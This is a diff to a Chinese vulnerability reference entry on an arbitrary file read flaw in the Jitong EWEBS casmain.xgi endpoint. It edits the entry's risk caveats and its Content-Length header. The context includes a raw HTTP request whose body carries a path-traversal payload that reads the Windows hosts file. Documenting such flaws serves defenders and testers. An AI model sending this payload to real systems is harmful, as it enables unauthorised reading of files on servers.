@@ -39,7 +39,7 @@ canonical: "Web安全/商业软件/极通/极通EWEBS casmain.xgi 任意文件�
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -77,11 +77,12 @@ Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN
+Content-Length: 57
 
 Language_S=../../../../windows/system32/drivers/etc/hosts
 ```
 
-> 请求长度说明：原资料 Content-Length 为 57；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 57；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ![](./.resource/极通EWEBScasmain.xgi任意文件读取漏洞/media/202202101939430.png)
